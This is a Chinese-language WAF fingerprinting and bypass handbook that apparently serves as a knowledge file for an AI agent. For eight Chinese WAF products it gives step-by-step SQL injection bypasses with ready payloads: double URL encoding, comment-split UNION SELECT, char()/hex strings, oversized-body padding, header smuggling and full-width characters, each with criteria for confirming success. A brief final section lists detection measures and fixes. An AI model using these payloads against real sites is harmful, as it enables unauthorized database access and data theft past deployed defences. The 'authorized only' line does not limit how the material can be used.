# 国产 WAF 指纹库与针对性绕过 — 完整攻防手册

> **AI 加载说明**：本手册覆盖国内主流 WAF（阿里云 WAF / 腾讯云 WAF / 长亭雷池 / 宝塔 WAF /
> 天融信 / 网宿 / 安全狗 / 云锁）的「指纹 → 绕过步骤 → payload → 绕过判据」完整链路。
> 先确认厂商（指纹），再按对应小节做针对性绕过；通用编码/分块/参数污染等手法见
> `../../web/waf-bypass-techniques.md` 与 `../waf-bypass-payloads.md`。
> 纪律：仅在**授权**目标上测试；绕过判据以「后端实际产生副作用」为准，而非仅看状态码。

---

## Part A：攻击方法论

### 0. 通用识别流程

1. 观察拦截响应头与页面文案（各厂商有独特关键词，见下表）。
2. 观察 Set-Cookie（阿里云 `aliyungf_tc`、腾讯云 `T-WAF`/`waf`、宝塔 `btwaf_` 等）。
3. 用 `wafw00f` 或发送明显攻击串观察拦截页。
4. 命中厂商后，进入对应小节做「解析差异 → 盲区 payload → 判据」。

| 厂商 | 指纹响应头 / Cookie | 拦截页关键词 |
|---|---|---|
| 阿里云 WAF | `aliyungf_tc`、`X-WAF-*`、`server: AliyunWAF` | 「阿里云 WAF」「访问被阻断」 |
| 腾讯云 WAF | `T-WAF-*`、`x-waf-*`、`Set-Cookie: waf` | 「腾讯云 WAF」「您的请求被拦截」 |
| 长亭雷池 | `SafeLine`/`sl-*`、`X-SafeLine-*`、默认 403 页 | 「雷池 SafeLine」「拦截」 |
| 宝塔 WAF | `btwaf_<hash>` cookie、`server: BWS` | 「宝塔 WAF」「拦截」 |
| 天融信 | `topsec` 相关、设备品牌页面 | 「天融信」「Topsec」 |
| 网宿 WAF | `waf_id`、`waf-*`、CDN 节点特征 | 「网宿 WAF」 |
| 安全狗 | `safedog`、`server: Safedog`、`yunsuo`（云锁） | 「安全狗」「网站安全狗」 |
| 云锁 | `yunsuo_session`、`server: yunsuo` | 「云锁」「Yunsuo」 |

---

### 1. 阿里云 WAF

#### 1.1 指纹

```
响应头: X-WAF-* / AliyunWAF
Set-Cookie: aliyungf_tc=...
拦截页: "阿里云 WAF" 或 JSON {"code":"BLOCKED", ...}
```

#### 1.2 绕过步骤

- 阿里云 WAF 对**参数值**做规则匹配，对**超长请求体 / 分块传输 / multipart 文件内容**检查较弱。
- 首选「参数污染 + 编码 + 注释拆分」组合，其次「超长 body 前缀把 payload 挤到检测预算外」。

#### 1.3 payload

```
# 参数污染（阿里云取最后一个参数，WAF 可能只查第一个）
?q=benign&q=' OR '1'='1

# 注释拆分
UN/**/ION SEL/**/ECT 1,2,3-- -

# 十六进制字面量
SELECT 0x61646D696E  -- "admin"

# 超长 body 前缀
POST /api/login
Content-Type: application/x-www-form-urlencoded
Content-Length: <large>
a=<8KB 填充>&q=' OR '1'='1
```

#### 1.4 绕过判据

- 后端 SQL 时间差（`SLEEP`/`BENCHMARK`）或布尔差异出现 = 真绕过。
- 仅 200 但 payload 被静默剥离 = 未绕过。

---

### 2. 腾讯云 WAF

#### 2.1 指纹

```
响应头: T-WAF-* / x-waf-*
Set-Cookie: waf=... / T-WAF
拦截页: "腾讯云 WAF" 或 "您的请求已被 WAF 拦截"
```

#### 2.2 绕过步骤

- 腾讯云 WAF 解码层次固定，**双重 URL 编码、Unicode 规范化（NFKC）、大小写混合**常奏效。
- 头部承载 payload（`X-Original-URL`/`X-Rewrite-URL`）比 query 参数弱。
- JSON body 的 `\uXXXX` 转义可绕过字符串匹配。

#### 2.3 payload

```
# 双重 URL 编码
?q=%2527%2520OR%2520%25271%2527%253D%25271

# Unicode 转义（JSON）
{"q":"\u0055\u004e\u0049\u004f\u004e \u0053\u0045\u004c\u0045\u0043\u0054 1,2,3"}

# 头部承载
X-Original-URL: /admin?q=' OR '1'='1

# 大小写混合
SeLeCt * FrOm users
```

#### 2.4 绕过判据

- 以「后端返回了本应被 WAF 拦截的数据」为准（如 union 注出数据 / 布尔差异）。
- 腾讯云 WAF 的挑战/验证码（`captcha`）与 payload 绕过是两回事，先过验证码再测 payload。

---

### 3. 长亭雷池（SafeLine）

#### 3.1 指纹

```
响应头: SafeLine / X-SafeLine-* / sl-*
默认拦截: 403 或 JSON {"success":false,...} 含 SafeLine 字样
```

#### 3.2 绕过步骤（SQLi 实测口径）

- 雷池检测以**语义引擎 + 规则**为主，对**语义等价改写**的识别强，但**结构混淆 + 编码叠加**仍有盲区。
- 实测有效（来源：cn-sec《从防御到绕过：长亭雷池 WAF 防护机制与 SQL 注入绕过实测》、
  长亭百川云《WAF 绕过奇技淫巧之 SQL 注入》）：
  1. **等价函数替换**：`UNION SELECT` → 用注释/空白变形拆分关键字。
  2. **内联注释 + 大小写**：`uNiOn/**/sElEcT`。
  3. **十六进制/char() 构造字符串**，避免直接写敏感字符串。
  4. **科学计数法 / 表达式改写布尔判断**：`1=1` → `1<>2` 之外用 `!(1=2)`、`2>1`。

#### 3.3 payload

```
# 注释 + 大小写拆分
uNiOn/**/sElEcT/**/1,2,3--%20-

# char() 构造
UNION SELECT char(97,100,109,105,110),2,3-- -

# 布尔表达式改写
' || 1-- -
' OR 2>1-- -
' AND '1' LIKE '1'-- -
```

#### 3.4 绕过判据

- 雷池对「改写后语义相同」会拦截，故**必须验证后端副作用**：union 注出数据列、时间盲注 `SLEEP(5)` 出现 5s 延迟。
- 若雷池仍 403，说明语义识别生效，需换「协议层」（分块/H2 降级）而非 payload 层，见 `../../web/waf-bypass-techniques.md`。

---

### 4. 宝塔 WAF（BaoTa）

#### 4.1 指纹

```
Set-Cookie: btwaf_<hash>=...
server: BWS（宝塔面板/nginx）
拦截页: "宝塔 WAF" / "被宝塔防火墙拦截"
```

#### 4.2 绕过步骤

- 宝塔 WAF 是**规则字符串匹配**为主，解码与语义能力弱。
- 首选「编码叠加 + 注释拆分 + 大小写」；其次「分块传输拆分 payload」。

#### 4.3 payload

```
# 双重编码
%2527%2520UNION%2520SELECT%25201,2,3--%2520-

# 注释拆分
' UN/**/ION SEL/**/ECT 1,2,3-- -

# 大小写
sElEcT/**/sLeEp(5)
```

#### 4.4 绕过判据

- 时间盲注延迟 / 布尔差异 = 真绕过。
- 宝塔 WAF 默认拦截日志会记录规则 id，观察是否命中，命中但后端已执行仍算绕过。

---

### 5. 天融信（Topsec）

#### 5.1 指纹

```
设备品牌页面 / topsec 字样
拦截页: "天融信" 或设备默认拦截页
```

#### 5.2 绕过步骤

- 天融信 WAF 常见于政企/等保场景，规则较旧，**编码绕过（URL/双重/hex）与分块传输**通常有效。
- 正向后缀/方法过滤较严，优先在「值」内做编码而非改路径。

#### 5.3 payload

```
?q=%27%20OR%20%271%27%3D%271
?q=%2527%2520OR%2520%25271%2527%253D%25271
```

#### 5.4 绕过判据

- 以「后端返回敏感数据 / 时间差」为准。

---

### 6. 网宿 WAF

#### 6.1 指纹

```
waf_id=... / waf-* 响应头
CDN 节点特征（网宿 CDN 与 WAF 常一体）
```

#### 6.2 绕过步骤

- 网宿 WAF 与 CDN 一体，**缓存命中可能跳过检测**；先测缓存行为（`X-Cache`）。
- 编码叠加 + 头部承载 + 参数污染。

#### 6.3 payload

```
# 缓存绕过（先投毒缓存干净响应，再命中）
GET /search?q=benign  → 命中缓存 → 后续攻击请求被缓存"放行"
# 需先确认缓存键与检测是否解耦

?q=benign&q=' OR '1'='1
```

#### 6.4 绕过判据

- 确认「同 URL 缓存命中」与「检测解耦」两条件同时成立才叫缓存绕过，否则回到 payload 层。

---

### 7. 安全狗（Safedog）

#### 7.1 指纹

```
响应头: server: Safedog / safedog 字样
拦截页: "网站安全狗" / "Safedog"
```

#### 7.2 绕过步骤

- 安全狗**规则匹配为主**，对「双重 URL 编码」敏感度低（社区经典绕过）。
- 注释拆分 + 大小写 + 十六进制同样有效。

#### 7.3 payload

```
# 双重 URL 编码（经典）
%2527%2520UNION%2520SELECT%25201,2,3--%2520-

# 注释拆分
UN/**/ION/**/SE/**/LECT 1,2,3-- -

# 十六进制
SELECT 0x61646D696E
```

#### 7.4 绕过判据

- 后端 union 注出数据 / 时间差 = 真绕过。

---

### 8. 云锁（Yunsuo）

#### 8.1 指纹

```
响应头: server: yunsuo / yunsuo_session=...
拦截页: "云锁" / "Yunsuo"
```

#### 8.2 绕过步骤

- 云锁对**数据包过长**会跳过检测（社区实测案例：超长请求体导致云锁绕过）。
- Unicode 全角字符（转全角）可绕过字符串匹配。

#### 8.3 payload

```
# 超长请求体撑爆检测
POST /search
Content-Type: application/x-www-form-urlencoded
Content-Length: <large>
a=<大段填充，数千字节以上>&q=' OR '1'='1

# Unicode 全角
ｓｅｌｅｃｔ 　（全角空格/全角字符绕过字符串匹配）
```

#### 8.4 绕过判据

- 实测「超长 body 后 payload 生效」= 绕过（来源：云锁「数据包过长导致绕过」案例，见审计 §7）。
- 判据仍以「后端副作用」为准。

---

## Part B：检测与防御

### 9. 检测规则

- 在 WAF 日志关注「解码后命中规则 id」与「原始请求」对照，识别被利用的规范化差异。
- 后端侧记录实际执行的 SQL/命令（RASP/日志），WAF 放行≠无害。

### 10. 修复方案（面向国产 WAF 使用者）

| 措施 | 说明 |
|---|---|
| 解码顺序与后端一致 | 双重编码/全角/Unicode 规范化不因解码不对称漏检 |
| 超长 body 不豁免 | 对超长请求体仍做截断+检测，或直接拒绝超大请求 |
| 语义引擎 + 规则双轨 | 雷池式语义引擎补规则盲区，规则补语义盲区 |
| 正向参数模型 | 学习合法参数集，未知参数/头部承载不再裸奔 |
| 记录绕过样本 | 把绕过 payload 沉淀为规则回归用例 |

> 来源：长亭雷池 SQLi 绕过实测（cn-sec.com/archives/4217089.html、rivers.chaitin.cn）、
> 云锁超长数据包绕过案例（shuzhiduo.com）。仅作技术思路参考，payload 为通用写法改写，未整篇搬运。
